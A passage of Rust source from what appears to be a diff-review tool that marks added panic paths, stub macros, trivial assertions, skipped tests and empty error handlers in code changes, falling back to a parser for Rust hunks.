        .filter(|signal| found.iter().any(|(_, s, _, _)| s == signal))
        .collect()
}

/// The code view of each line of `hunk` on the old and on the new side: comments and strings
/// blank, in the state the scanner reached on that side. In Rust a raw identifier reads as the
/// identifier it is ([`without_raw_prefixes`]).
fn hunk_views(
    hunk: &PatchHunk,
    language: Option<Language>,
) -> Vec<(Option<String>, Option<String>)> {
    let mut old_state = ScanState::default();
    let mut new_state = ScanState::default();
    hunk.lines
        .iter()
        .map(|line| {
            let view = |state: &mut ScanState| {
                language.map(|l| {
                    let code = code_view(l, &line.text, state);
                    if l == Language::Rust {
                        without_raw_prefixes(&code).unwrap_or(code)
                    } else {
                        code
                    }
                })
            };
            match line.kind {
                PatchLineKind::Context => (view(&mut old_state), view(&mut new_state)),
                PatchLineKind::Added => (None, view(&mut new_state)),
                PatchLineKind::Removed => (view(&mut old_state), None),
            }
        })
        .collect()
}

/// `(side, signal, line, basis)` for every signal some rule finds on a changed line of `hunk`:
/// once per signal and line however many rules or tokens match, in [`EvidenceSignal::ALL`] order,
/// with the highest [`Basis`] among the rules that matched. Block comments and triple strings are
/// followed through the hunk on each side (state starts fresh per hunk). `parse` lets the parser
/// read a Rust hunk on top of that ([`FragmentPlan`]).
fn hunk_matches(
    hunk: &PatchHunk,
    language: Option<Language>,
    rules: &[&Rule],
    reading: Reading,
) -> HunkFound {
    // First the code view of every line on each side it belongs to, so a rule that reads a
    // neighbour sees it as code, in the state the scanner reached there.
    let views = hunk_views(hunk, language);
    // The code of the next line on `side` after line `at`: the line that follows it in that
    // version of the file, when the hunk holds it.
    let next_on = |side: Side, at: usize| -> Option<&str> {
        let other = match side {
            Side::New => PatchLineKind::Removed,
            Side::Old => PatchLineKind::Added,
        };
        let next = at + 1 + hunk.lines[at + 1..].iter().position(|l| l.kind != other)?;
        let view = match side {
            Side::New => views[next].1.as_deref(),
            Side::Old => views[next].0.as_deref(),
        };
        Some(view.unwrap_or(hunk.lines[next].text.as_str()))
    };
    // Rung 2, asked before the lines are read so that its answer is merged line by line and the
    // items come out in hunk order with no sorting (a hunk can hold a million of them). A Rust
    // hunk that holds a word the parser reads, and that the parser did not read (the plan did
    // not allow it, it is over the fragment budget, or the parser gave no answer), says so on
    // one line. Otherwise whoever orders the hunks of a review could spend the parser's budget
    // and have a later construct that only the parser finds go unseen, with nothing to show
    // for it (review V3 round 3, VD3R3-H-2).
    let word = if language == Some(Language::Rust) {
        first_parser_word(hunk)
    } else {
        None
    };
    let parsed = match word {
        Some(_) if reading != Reading::Off => fragment_evidence(hunk, &views),
        _ => None,
    };
    // Not parsed: the hunk says so once, where its first word is. Parsed: see `Parsed::unread`.
    let unparsed = if parsed.is_none() { word } else { None };
    let mut marked = false;
    let mut found: Vec<(Side, EvidenceSignal, u32, Basis)> = Vec::new();
    for (at, line) in hunk.lines.iter().enumerate() {
        let (side, number, view) = match line.kind {
            PatchLineKind::Context => continue,
            PatchLineKind::Added => (Side::New, line.new_line, views[at].1.as_deref()),
            PatchLineKind::Removed => (Side::Old, line.old_line, views[at].0.as_deref()),
        };
        let Some(number) = number else { continue };
        let raw = if language == Some(Language::Rust) {
            without_raw_prefixes(&line.text)
        } else {
            None
        };
        let raw = raw.as_deref().unwrap_or(line.text.as_str());
        let hits = |rule: &Rule| {
            let text = match rule.view {
                View::Raw => raw,
                // A rule that reads code needs a language; `Scope::Any` code rules have none.
                View::Code => view.unwrap_or(line.text.as_str()),
            };
            match rule.matches {
                Match::Tokens(tokens) => tokens.iter().any(|t| token_in(text, t)),
                Match::AnyCode => !text.trim().is_empty(),
                Match::Secret => looks_like_secret(text),
                Match::Imports(modules) => imports_module(text, &line.text, modules),
                Match::EmptyHandler => {
                    language.is_some_and(|l| empty_handler(l, text, next_on(side, at)))
                }
                Match::Method(names) => names.iter().any(|name| calls_method(text, name)),
                Match::Spaced { heads, tails } => spaced(text, heads, tails),
                Match::TrivialAssertRust => trivial_assert_rust(text),
                Match::IgnoreRust => ignore_rust(text),
            }
        };
        let first_of_line = found.len();
        for signal in EvidenceSignal::ALL {
            let mut basis = rules
                .iter()
                .filter(|r| r.signal == signal && r.side == side && hits(r))
                .map(|r| r.matches.basis())
                .max();
            if side == Side::New {
                // `SyntaxUnchecked` is the last signal, so the line's other signals are known.
                if signal == S::SyntaxUnchecked && !marked {
                    marked = unparsed == Some(at)
                        || parsed.as_ref().is_some_and(|parsed| {
                            parsed.leaves_unread(at, &found[first_of_line..])
                        });
                    if marked {
                        basis = Some(Basis::Lexical);
                    }
                }
                // What the parser found is added, or its basis raised. It takes nothing away:
                // where it found nothing, or could not read, the lower rungs' answer stands.
                if parsed
                    .as_ref()
                    .is_some_and(|parsed| Parsed::has(&parsed.found, at, signal))
                {
                    basis = basis.max(Some(Basis::SyntaxFragment));
                }
            }
            if let Some(basis) = basis {
                found.push((side, signal, number, basis));
            }
        }
    }
    HunkFound {
        test_likely: Parsed::likely_lines(parsed.as_ref(), hunk),
        items: found,
    }
}

/// Whether `code` calls a method named `name`: `.name(`, with nothing but whitespace between the
/// dot, the name and the parenthesis (`value.unwrap ()` is the same call), or calls it by a
/// path, whatever the path (`<Option<u32>>::unwrap(x)`, `Result::<u32, E>::unwrap(r)`), or
/// names the standard one as a function to pass (`.map(Result::unwrap)`, `Option :: expect`).
///
/// This reads one line. Where the parser reads the hunk it names each of these as a construct
/// itself, the path forms included and over any number of lines (`X::` and `unwrap(x)` on the
/// next; review V3 round 9, VD3R9-M-1), and for a path passed as a value it does not ask whose
/// path it is. This rule is what is left where the parser does not read: past a budget, under
/// an error, inside another macro's body.
fn calls_method(code: &str, name: &str) -> bool {
    code.match_indices(name).any(|(at, _)| {
        let before = code[..at].trim_end();
        let after = &code[at + name.len()..];
        if after.trim_start().starts_with('(') {
            return before.ends_with('.') || before.ends_with("::");
        }
        let whole = after
            .bytes()
            .next()
            .is_none_or(|b| !(b.is_ascii_alphanumeric() || b == b'_'));
        whole
            && before.strip_suffix("::").is_some_and(|owner| {
                let owner = owner.trim_end();
                ["Result", "Option"].iter().any(|standard| {
                    owner.strip_suffix(standard).is_some_and(|rest| {
                        rest.bytes()
                            .next_back()
                            .is_none_or(|b| !(b.is_ascii_alphanumeric() || b == b'_'))
                    })
                })
            })
    })
}

/// `text` with the prefix of each raw identifier blanked (`x.r#unwrap()` reads `x.  unwrap()`),
/// or `None` when it holds none. To the compiler `r#unwrap` is the identifier `unwrap`, so a
/// rule that reads a name has to read it the same way; the rules pass over whitespace, and the
/// columns stay where they were (review V3 round 8, VD3R8-M-1: `x.r#unwrap()` and
/// `X::r#unwrap(x)` left neither an item nor a mark). The opener of a raw string (`r#"`) is not
/// an identifier and is left alone.
fn without_raw_prefixes(text: &str) -> Option<String> {
    let bytes = text.as_bytes();
    let in_name = |b: u8| b.is_ascii_alphanumeric() || b == b'_' || !b.is_ascii();
    let mut out: Option<Vec<u8>> = None;
    for (at, _) in text.match_indices("r#") {
        let starts = at == 0 || !in_name(bytes[at - 1]);
        let names = bytes
            .get(at + 2)
            .is_some_and(|b| b.is_ascii_alphabetic() || *b == b'_' || !b.is_ascii());
        if starts && names {
            let out = out.get_or_insert_with(|| bytes.to_vec());
            out[at] = b' ';
            out[at + 1] = b' ';
        }
    }
    // Only two ASCII bytes were replaced by two ASCII bytes: still UTF-8.
    out.and_then(|bytes| String::from_utf8(bytes).ok())
}

/// Whether `text` holds one of `heads`, whole and with no [`is_boundary_blocker`] byte before
/// it, followed by one of `tails` ([`follows`]): `todo ! (` holds `todo` and `!(`.
///
/// These rules stand where exact tokens stood, one search for each word as before: a search
/// has a fixed cost for every line whether or not the word is there, and a first version that
/// added twelve of them made a million-line patch a second slower (2.3 s to 3.3 s).
fn spaced(text: &str, heads: &[&str], tails: &[&str]) -> bool {
    let bytes = text.as_bytes();
    heads.iter().any(|head| {
        text.match_indices(head).any(|(start, _)| {
            (start == 0 || !is_boundary_blocker(bytes[start - 1]))
                && tails
                    .iter()
                    .any(|tail| follows(&bytes[start + head.len()..], tail.as_bytes()).is_some())
        })
    })
}

/// Where `tail` ends in `rest`, when `rest` begins with it and the whitespace before each of
/// the tail's bytes is passed over.
fn follows(rest: &[u8], tail: &[u8]) -> Option<usize> {
    let mut at = 0;
    for expected in tail {
        while rest.get(at).is_some_and(u8::is_ascii_whitespace) {
            at += 1;
        }
        if rest.get(at) != Some(expected) {
            return None;
        }
        at += 1;
    }
    Some(at)
}

/// Rust `assert!(true)`, `assert!(true, …)`, `assert_eq!(true, true)`, `assert_eq!(true, true,
/// …)` and their `debug_` forms, whatever the spacing between the word and what follows it.
/// One search, for `assert`.
fn trivial_assert_rust(text: &str) -> bool {
    const WORD: &str = "assert";
    let bytes = text.as_bytes();
    text.match_indices(WORD).any(|(at, _)| {
        let start = if text[..at].ends_with("debug_") {
            at - "debug_".len()
        } else {
            at
        };
        if start > 0 && is_boundary_blocker(bytes[start - 1]) {
            return false;
        }
        let rest = &bytes[at + WORD.len()..];
        let (rest, arguments): (&[u8], &[u8]) = match rest.strip_prefix(b"_eq") {
            Some(rest) => (rest, b"!(true,true"),
            None => (rest, b"!(true"),
        };
        follows(rest, arguments).is_some_and(|end| {
            follows(&rest[end..], b")").is_some() || follows(&rest[end..], b",").is_some()
        })
    })
}

/// Rust `#[ignore]`, `#[ignore = "…"]`, and `#[cfg_attr(…, ignore)]` (with `= "…"` or more
/// after `ignore`, or with the `ignore` applied by a `cfg_attr` inside the first): the test
/// does not run, or does not under some configuration. Whatever the spacing. One search, for
/// `#`.
///
/// Each `cfg_attr` list on the line is read from its own start to its end, so lists written
/// inside one another are read once for each list around them, and a line that is nothing but
/// `#[cfg_attr(` cost the square of its length: 880 KB of it took 32 s (found 2026-11-14 while
/// the rule was taught nested lists; the cost was older). No code nests them so. The lists of
/// one line may together cost [`CFG_ATTR_READS`] times the line and a little more; a line
/// past that is taken to hold a skip, since what was not read is no reason to drop evidence.
fn ignore_rust(text: &str) -> bool {
    let bytes = text.as_bytes();
    let allowance = bytes
        .len()
        .saturating_mul(CFG_ATTR_READS)
        .saturating_add(4096);
    let mut read = 0usize;
    text.match_indices('#').any(|(at, _)| {
        if at > 0 && is_boundary_blocker(bytes[at - 1]) {
            return false;
        }
        let rest = &bytes[at + 1..];
        if let Some(end) = follows(rest, b"[ignore") {
            return rest
                .get(end)
                .is_none_or(|b| !(b.is_ascii_alphanumeric() || *b == b'_'));
        }
        follows(rest, b"[cfg_attr(").is_some_and(|end| {
            let (skips, cost) = cfg_attr_skips(&rest[end..]);
            read = read.saturating_add(cost);
            skips || read > allowance
        })
    })
}

/// How many times the length of a line its `cfg_attr` lists may cost to read ([`ignore_rust`]).
const CFG_ATTR_READS: usize = 16;

/// Whether the arguments of a `cfg_attr(`, from just after its parenthesis, hold `ignore` as an
/// attribute of their own: an argument after the condition that is `ignore` or `ignore = …`.
/// An `ignore` nested in another attribute's list is that attribute's
/// (`cfg_attr(feature = "serde", serde(skip, ignore))` skips no test; independent review,
/// IR-L-2), and the condition is not an attribute at all.
///
/// One nested list is followed, and only that one: an argument after the condition that is
/// itself `cfg_attr(…)` applies attributes too, so its arguments are read by the same rule
/// (`cfg_attr(all(), cfg_attr(all(), ignore))` skips the test; second independent review,
/// IR2-M-2). One pass, with a count of the lists entered and no recursion: a line can nest
/// as many as it has bytes for.
///
/// The answer comes with its cost: how many bytes were read for it.
fn cfg_attr_skips(arguments: &[u8]) -> (bool, usize) {
    // Brackets open inside the current list, other than a followed `cfg_attr(`.
    let mut depth = 0usize;
    // How many `cfg_attr(` lists are open around the current one. Each was entered from an
    // argument after its list's condition, so that is all there is to remember of them.
    let mut levels = 0usize;
    let mut argument = 0usize;
    // Where the current argument begins: its first byte that is not whitespace.
    let mut start: Option<usize> = None;
    // The current argument was a nested `cfg_attr(…)`, now closed: it is not `ignore`,
    // whatever stands between it and the next comma.
    let mut spent = false;
    let is_ignore = |text: &[u8]| {
        let text = text.trim_ascii();
        text.strip_prefix(b"ignore")
            .is_some_and(|rest| rest.trim_ascii_start().first().is_none_or(|b| *b == b'='))
    };
    for (at, byte) in arguments.iter().enumerate() {
        if depth == 0 && start.is_none() && !byte.is_ascii_whitespace() {
            start = Some(at);
        }
        let here = start.unwrap_or(at);
        match byte {
            b'(' if depth == 0
                && argument > 0
                && !spent
                && arguments[here..at].trim_ascii_end() == b"cfg_attr" =>
            {
                levels += 1;
                argument = 0;
                start = None;
            }
            b'(' | b'[' | b'{' => depth += 1,
            b')' | b']' | b'}' if depth > 0 => depth -= 1,
            b',' | b')' if depth == 0 => {
                if argument > 0 && !spent && is_ignore(&arguments[here..at]) {
                    return (true, at + 1);
                }
                if *byte == b',' {
                    argument += 1;
                    spent = false;
                } else if levels == 0 {
                    return (false, at + 1);
                } else {
                    // back in the list around it, in an argument after its condition
                    levels -= 1;
                    argument = 1;
                    spent = true;
                }
                start = None;
            }
            _ => {}
        }
    }
    // the list is not closed on this line: what is here so far
    let skips = argument > 0 && !spent && start.is_some_and(|start| is_ignore(&arguments[start..]));
    (skips, arguments.len())
}

/// What the parser says about the added lines of a Rust hunk: the `(line index, signal)` pairs
/// it found, sorted by line index. It has no way to say that an item is not there.
struct Parsed {
    found: Vec<(usize, EvidenceSignal)>,
    /// The words of the parser's constructs that it did not read, by the line they are on and
    /// the signal the token rules would have to report for the word to be accounted for,
    /// sorted by line index. See [`unread_words`].
    unread: Vec<(usize, EvidenceSignal)>,
    /// The added lines, by index and in order, that lie in an item whose attribute spells a
    /// test: a hint, see [`Evidence::test_likely`].
    test_likely: Vec<usize>,
}

/// What [`hunk_matches`] finds in one hunk.
struct HunkFound {
    /// `(side, signal, line, basis)`, in hunk order and then the order of
    /// [`EvidenceSignal::ALL`].
    items: Vec<(Side, EvidenceSignal, u32, Basis)>,
    /// New-side line numbers, ascending, that lie in an item whose attribute spells a test.
    test_likely: Vec<u32>,
}

impl Parsed {
    /// Whether line `at` holds a word of the parser's that nothing read: one whose signal is
    /// not among the line's items (`reported`).
    fn leaves_unread(&self, at: usize, reported: &[(Side, EvidenceSignal, u32, Basis)]) -> bool {
        Self::signals_at(&self.unread, at)
            .any(|wanted| !reported.iter().any(|item| item.1 == wanted))
    }

    /// The signals `list` (sorted by line index) holds for line `at`.
    fn signals_at(
        list: &[(usize, EvidenceSignal)],
        at: usize,
    ) -> impl Iterator<Item = EvidenceSignal> + '_ {
        let from = list.partition_point(|pair| pair.0 < at);
        list[from..]
            .iter()
            .take_while(move |pair| pair.0 == at)
            .map(|pair| pair.1)
    }

    /// The new-side line numbers, ascending, of the added lines in an item whose attribute
    /// spells a test; none when the parser gave no answer.
    fn likely_lines(parsed: Option<&Self>, hunk: &PatchHunk) -> Vec<u32> {
        parsed.map_or_else(Vec::new, |parsed| {
            parsed
                .test_likely
                .iter()
                .filter_map(|index| hunk.lines[*index].new_line)
                .collect()
        })
    }

    /// Whether `list` (sorted by line index) holds `signal` for line `at`.
    fn has(list: &[(usize, EvidenceSignal)], at: usize, signal: EvidenceSignal) -> bool {
        let from = list.partition_point(|pair| pair.0 < at);
        list[from..]
            .iter()
            .take_while(|pair| pair.0 == at)
            .any(|pair| pair.1 == signal)
    }
}

/// One side of a hunk as the parser read it.
struct SideScan {
    scan: FragmentScan,
    /// Rows the wrapping put before the first line of the side.
    offset: u32,
    /// The hunk lines of this side, in order: row `n` of the side is `hunk.lines[lines[n]]`.
    lines: Vec<usize>,
}

impl SideScan {
    /// The hunk line that tree row `row` is, when it is a line of this side.
    fn line_of(&self, row: u32) -> Option<usize> {
        let row = row.checked_sub(self.offset)?;
        self.lines.get(row as usize).copied()
    }
}

/// One side of `hunk` (its context lines and its added or removed lines) parsed as a fragment,
/// after the braces the hunk leaves open are closed and the ones it closes without opening are
/// opened. Up to three wrappings are tried and the one the parser reads most of is kept. `None`
/// when there is no answer: the side is over the fragment budget, or the parser gave none.
fn scan_side(
    hunk: &PatchHunk,
    views: &[(Option<String>, Option<String>)],
    side: Side,
) -> Option<SideScan> {
    let other = match side {
        Side::New => PatchLineKind::Removed,
        Side::Old => PatchLineKind::Added,
    };
    let lines: Vec<usize> = (0..hunk.lines.len())
        .filter(|at| hunk.lines[*at].kind != other)
        .collect();
    // The size is known before anything is built: a hunk over the budget used to be joined and
    // wrapped first, and a 60 MiB line of `}` cost 900 MiB (review V3 round 2, VD3R2-H-2).
    let bytes: usize = lines.iter().map(|at| hunk.lines[*at].text.len() + 1).sum();
    if bytes > deep_diff_forge_syntax::FRAGMENT_BYTE_BUDGET {
        return None;
    }
    // Braces are counted on the code view, where a brace in a string or a comment is blank.
    let (mut unopened, mut open) = (0usize, 0usize);
    for at in &lines {
        let view = match side {
            Side::New => views[*at].1.as_deref(),
            Side::Old => views[*at].0.as_deref(),
        };
        for byte in view.unwrap_or(hunk.lines[*at].text.as_str()).bytes() {
            match byte {
                b'{' => open += 1,
                b'}' if open == 0 => unopened += 1,
                b'}' => open -= 1,
                _ => {}
            }
        }
    }
    let body: Vec<&str> = lines
        .iter()
        .map(|at| hunk.lines[*at].text.as_str())
        .collect();
    let body = body.join("\n");
    let rows = u32::try_from(lines.len()).ok()?;
    let closers = "}".repeat(open + unopened + 1);
    // Each wrapping puts its opening on one line of its own, so a body row is a tree row less one.
    let mut wrappings: Vec<(String, u32)> = Vec::new();
    if unopened == 0 && open == 0 {
        wrappings.push((body.clone(), 0));
    }
    wrappings.push((
        format!(
            "fn ddf_fragment() {{{}\n{body}\n{closers}",
            " {".repeat(unopened)
        ),
        1,
    ));
    if unopened > 0 {
        // The innermost block the hunk closes may be a `match`.
        wrappings.push((
            format!(
                "fn ddf_fragment() {{{} match ddf_fragment {{\n{body}\n{closers}",
                " {".repeat(unopened - 1)
            ),
            1,
        ));
    }
    let mut best: Option<(u32, FragmentScan, u32)> = None;
    for (source, offset) in wrappings {
        let Some(scan) = scan_fragment(deep_diff_forge_syntax::Language::Rust, &source) else {
            continue;
        };
        let unread = scan.unreadable_in(offset, rows);
        if best.as_ref().is_none_or(|(least, _, _)| unread < *least) {
            best = Some((unread, scan, offset));
        }
        if unread == 0 {
            break;
        }
    }
    let (_, scan, offset) = best?;
    Some(SideScan {
        scan,
        offset,
        lines,
    })
}

/// What the parser finds on the added lines of `hunk`. `None` when there is no answer (nothing
/// added, over budget, or no parse).
///
/// A construct that starts on an added line is new. A construct that starts on an unchanged
/// line and reaches an added one (a macro invocation or an attribute over several lines) was
/// there before, so it is evidence unless the old side shows the same construct, at the same
/// place on that line, already carrying the same signal: `assert!(` over `computes()` becoming
/// `assert!(` over `true` is a trivial assertion added, on the added line; a `todo!(…)` or an
/// `assert!(true, …)` whose message alone changed is not (review V3 round 2, VD3R2-M-1). The
/// place is the line and the column, so another construct on the same line is not mistaken for
/// it, and when the old side cannot be read the item stands: what is not known is never a
/// reason to drop evidence (review V3 round 3, VD3R3-M-1). The old side is parsed only when
/// such a construct is met.
fn fragment_evidence(
    hunk: &PatchHunk,
    views: &[(Option<String>, Option<String>)],
) -> Option<Parsed> {
    fragment_cost(hunk)?;
    let new = scan_side(hunk, views, Side::New)?;
    let mut old: Option<Option<SideScan>> = None;
    let mut parsed = Parsed {
        found: Vec::new(),
        unread: unread_words(hunk, views, &new),
        test_likely: likely_test_lines(hunk, views, &new),
    };
    for construct in &new.scan.constructs {
        let Some(signal) = signal_of(&construct.kind) else {
            continue;
        };
        let Some(start) = new.line_of(construct.row) else {
            continue;
        };
        let index = if hunk.lines[start].kind == PatchLineKind::Added {
            start
        } else {
            let Some(added) = (construct.row..=construct.last_row)
                .filter_map(|row| new.line_of(row))
                .find(|index| hunk.lines[*index].kind == PatchLineKind::Added)
            else {
                continue;
            };
            // It was there before only if the old side has the same construct at the same
            // place: for a macro, one that carries the same signal (a changed message is no
            // change); for an attribute, the same attribute, its whole text compared without
            // whitespace, since a conditional skip whose condition changed is another skip.
            // The words alone are not the attribute: they are the same for
            // `cfg_attr(all(miri), ignore)` and `cfg_attr(all(), ignore)`, and for
            // `target_os = "plan9"` and `"linux"` (independent review, IR-M-3; second
            // independent review, IR2-M-1).
            let carried_it_before = old
                .get_or_insert_with(|| scan_side(hunk, views, Side::Old))
                .as_ref()
                .is_some_and(|before| {
                    before.scan.constructs.iter().any(|was| {
                        before.line_of(was.row) == Some(start)
                            && was.column == construct.column
                            && match (&was.kind, &construct.kind) {
                                (ConstructKind::Attribute { .. }, _) => was.kind == construct.kind,
                                _ => signal_of(&was.kind) == Some(signal),
                            }
                    })
                });
            if carried_it_before {
                continue;
            }
            added
        };
        parsed.found.push((index, signal));
    }
    parsed.found.sort_by_key(|pair| pair.0);
    Some(parsed)
}

/// The stretch of code on a line: the byte columns of its first and just past its last
/// character that is not whitespace, in the code view (comments are blank there). `None` for
/// a line with no code.
fn code_extent(code: &str) -> Option<(u32, u32)> {
    let first = code.len() - code.trim_start().len();
    let last = code.trim_end().len();
    (first < last).then(|| {
        (
            u32::try_from(first).unwrap_or(u32::MAX),
            u32::try_from(last).unwrap_or(u32::MAX),
        )
    })
}

/// The added lines of `hunk`, by index and in order, that lie in an item whose attribute spells
/// a test: the hint of [`Evidence::test_likely`], never proof.
///
/// A line is one when all the code on it lies inside one such item, from the first thing on the
/// line to the last: by the line alone, a production function that shares a line with a test
/// function carried the hint (review V3 round 7, VD3R7-L-1; independent review, IR-H-1). The
/// code of a line is measured on the lexer's code view, which ends a block comment at the
/// first `*/` where the compiler nests them, so after `/* /* */ " */` it takes the rest of the
/// line for a string and the line for shorter than it is. So a second condition: no panic
/// path that the parser names on the line may lie outside such an item (second independent
/// review, IR2-L-1: the production call after such a comment carried the hint).
fn likely_test_lines(
    hunk: &PatchHunk,
    views: &[(Option<String>, Option<String>)],
    new: &SideScan,
) -> Vec<usize> {
    // lines that hold a panic path outside every item that spells a test, sorted
    let mut outside: Vec<usize> = new
        .scan
        .constructs
        .iter()
        .filter(|construct| {
            !construct.test_spelled && signal_of(&construct.kind) == Some(S::PanicPathAdded)
        })
        .filter_map(|construct| new.line_of(construct.row))
        .collect();
    outside.sort_unstable();
    (0u32..)
        .zip(&new.lines)
        .filter(|(row, index)| {
            let line = &hunk.lines[**index];
            let code = views[**index].1.as_deref().unwrap_or(line.text.as_str());
            let row = row + new.offset;
            line.kind == PatchLineKind::Added
                && code_extent(code)
                    .is_some_and(|(first, last)| new.scan.spells_test((row, first), (row, last)))
                && outside.binary_search(index).is_err()
        })
        .map(|(_, index)| *index)
        .collect()
}

/// The identifiers the parser's constructs are spelled with, and the signal each belongs to.
const CONSTRUCT_WORDS: [(&str, EvidenceSignal); 9] = [
    ("unwrap", S::PanicPathAdded),
    ("expect", S::PanicPathAdded),
    ("assert", S::TrivialAssert),
    ("assert_eq", S::TrivialAssert),
    ("debug_assert", S::TrivialAssert),
    ("debug_assert_eq", S::TrivialAssert),
    ("todo", S::StubAdded),
    ("unimplemented", S::StubAdded),
    ("ignore", S::TestSkipped),
];

/// The words of the parser's constructs that nothing read, on the added lines of a hunk the
/// parser did parse: `(line index, the signal the word belongs to)`, sorted by line.
///
/// The parser read the hunk, and still there are places in it where it names no construct:
/// inside another macro's body, which it does not expand, and under an error. A whole
/// identifier there that spells one of its constructs is unread when it is not a construct's
/// own name and, for an assertion, the token rules could not read it either, because its
/// parenthesis does not close on the line. The caller marks the line `syntax_unchecked`
/// unless a token rule reported that word's signal on it. So inside `outer! { … }` a
/// one-line `assert!(a == b);` is silent (a token rule read it whole and found it sound), a
/// one-line `x.unwrap();` is `panic_path_added`, and `assert!(` / `true` / `);`, `todo` /
/// `!()`, `x.unwrap` / `()`, `assert!{true}` and `#[` / `ignore]` are marked: before, each of
/// those left no trace (review V3 rounds 4 and 5; independent review, IR-M-2).
fn unread_words(
    hunk: &PatchHunk,
    views: &[(Option<String>, Option<String>)],
    new: &SideScan,
) -> Vec<(usize, EvidenceSignal)> {
    let mut unread = Vec::new();
    for (row, index) in (0u32..).zip(&new.lines) {
        let line = &hunk.lines[*index];
        let row = row + new.offset;
        if line.kind != PatchLineKind::Added || new.scan.readable(row) {
            continue;
        }
        let code = views[*index].1.as_deref().unwrap_or(line.text.as_str());
        let open = unmatched_parentheses(code);
        for (at, word) in identifiers_in(code) {
            let Some((_, signal)) = CONSTRUCT_WORDS.iter().find(|(known, _)| *known == word) else {
                continue;
            };
            let column = u32::try_from(at).unwrap_or(u32::MAX);
            if new.scan.names((row, column)) {
                continue;
            }
            // An assertion whose parenthesis closes on the line was read whole by a token
            // rule, whatever it found.
            let rest = &code.as_bytes()[at + word.len()..];
            let closed = *signal == S::TrivialAssert
                && follows(rest, b"!(")
                    .is_some_and(|end| open.binary_search(&(at + word.len() + end - 1)).is_err());
            if !closed {
                unread.push((*index, *signal));
            }
        }
    }
    unread
}

/// The identifiers of a line of code, each with the byte column it starts at.
fn identifiers_in(code: &str) -> impl Iterator<Item = (usize, &str)> {
    let bytes = code.as_bytes();
    let is_word = |b: u8| b.is_ascii_alphanumeric() || b == b'_';
    let mut at = 0;
    std::iter::from_fn(move || {
        loop {
            while at < bytes.len() && !is_word(bytes[at]) {
                at += 1;
            }
            let start = at;
            while at < bytes.len() && is_word(bytes[at]) {
                at += 1;
            }
            if start == at {
                return None;
            }
            // a run that starts with a digit is a number, not an identifier
            if !bytes[start].is_ascii_digit() {
                return Some((start, &code[start..at]));
            }
        }
    })
}

/// The byte columns of the `(` on a line that no `)` on the line closes, in order. One pass:
/// asking each opener in turn whether it closes made a line of nested assertions quadratic
/// (independent review, IR-H-3).
fn unmatched_parentheses(code: &str) -> Vec<usize> {
    let mut open = Vec::new();
    for (at, byte) in code.bytes().enumerate() {
        match byte {
            b'(' => open.push(at),
            b')' => {
                open.pop();
            }
            _ => {}
        }
    }
    open
}

/// The signal a Rust construct is evidence of, if any.
fn signal_of(kind: &ConstructKind) -> Option<EvidenceSignal> {
    match kind {
        ConstructKind::Attribute { words, .. } => {
            let first = words.first().map(String::as_str);
            // `words` are the path and the attribute's own arguments: after `cfg_attr` comes
            // its condition, then the attributes it applies, those of a `cfg_attr` among them
            // included (`cfg_attr(all(), cfg_attr(all(), ignore))`).
            let ignored = first == Some("ignore")
                || (first == Some("cfg_attr") && words.iter().skip(2).any(|w| w == "ignore"));
            ignored.then_some(S::TestSkipped)
        }
        ConstructKind::MacroCall { name, arguments } => match name.as_str() {
            "assert" | "debug_assert" => {
                (arguments == "true" || arguments.starts_with("true,")).then_some(S::TrivialAssert)
            }
            "assert_eq" | "debug_assert_eq" => (arguments == "true,true"
                || arguments.starts_with("true,true,"))
            .then_some(S::TrivialAssert),
            "todo" | "unimplemented" => Some(S::StubAdded),
            _ => None,
        },
        ConstructKind::MethodCall { name } => {
            matches!(name.as_str(), "unwrap" | "expect").then_some(S::PanicPathAdded)
        }
    }
}

/// Whether `code` (a line's code view) opens an error handler that does nothing, given the code
/// of the line after it on the same side (`None` when the hunk ends there).
///
/// - Python: `except …:` whose body is `pass` or `...`, on the same line or the next.
/// - JS and TS: `catch`, with or without a binding, whose block is empty: `{}` on the line, `{`
///   ending the line and `}` starting the next, or the whole empty block on the next line. Also
///   a promise's `.catch(…)` whose handler is a function with an empty body, on one line.
/// - Go: `if err != nil {`, with or without a statement before the test, closed at once, on the
///   line or the next.
///
/// A handler whose body the hunk does not show is not evidence: the next line must be there.
fn empty_handler(language: Language, code: &str, next: Option<&str>) -> bool {
    let line = code.trim();
    let next = next.map(str::trim);
    let nothing = |body: &str| matches!(body, "pass" | "...");
    // The block after `head` is empty: `{}` here, or `{` here and `}` first on the next line.
    let empty_block = |after: &str| {
        let after = after.trim();
        let closed_here = after
            .strip_prefix('{')
            .is_some_and(|rest| rest.trim_start().starts_with('}'));
        let block_on_next_line = after.is_empty()
            && next.is_some_and(|n| {
                n.strip_prefix('{')
                    .is_some_and(|rest| rest.trim_start().starts_with('}'))
            });
        closed_here
            || (after == "{" && next.is_some_and(|n| n.starts_with('}')))
            || block_on_next_line
    };
    match language {
        Language::Python => {
            let Some(rest) = line.strip_prefix("except") else {
                return false;
            };
            if rest.as_bytes().first().is_some_and(|b| is_ident(*b)) {
                return false;
            }
            let Some((_, body)) = rest.rsplit_once(':') else {
                return false;
            };
            let body = body.trim();
            nothing(body) || (body.is_empty() && next.is_some_and(nothing))
        }
        Language::JavaScript => line.match_indices("catch").any(|(at, word)| {
            // A promise's `.catch(…)` swallows when its handler is a function with an empty body.
            if at > 0 && line.as_bytes()[at - 1] == b'.' {
                return empty_callback(&line[at + word.len()..]);
            }
            let before_ok = at == 0 || !is_boundary_blocker(line.as_bytes()[at - 1]);
            let after = line[at + word.len()..].trim_start();
            if !before_ok || after.as_bytes().first().is_some_and(|b| is_ident(*b)) {
                return false;
            }
            // An optional binding in parentheses, then the block.
            let after = match after.strip_prefix('(') {
                Some(binding) => match binding.split_once(')') {
                    Some((_, block)) => block,
                    None => return false,
                },
                None => after,
            };
            empty_block(after)
        }),
        // `if err != nil {` and `if err := f(); err != nil {`: the test comes last in the head.
        Language::Go => line.strip_prefix("if ").is_some_and(|head| {
            head.rsplit_once("err != nil")
                .is_some_and(|(_, after)| empty_block(after))
        }),
        Language::Rust | Language::Shell | Language::Yaml => false,
    }
}

/// Whether `after` (what follows `.catch` on a line of code) is a call whose argument is a
/// function with an empty body: `(() => {})`, `(e => {})`, `(async (e) => { })`,
/// `(function () {})`. Anything else, including a handler that names a function, is not.
fn empty_callback(after: &str) -> bool {
    let Some(inner) = after.trim_start().strip_prefix('(') else {
        return false;
    };
    let inner = inner.trim_start();
    let inner = inner.strip_prefix("async ").unwrap_or(inner).trim_start();
    let body = if let Some(rest) = inner.strip_prefix("function") {
        // An optional name, then the parameters.
        let rest = rest.trim_start();
        let name = rest.bytes().take_while(|b| is_ident(*b)).count();
        let Some(rest) = rest
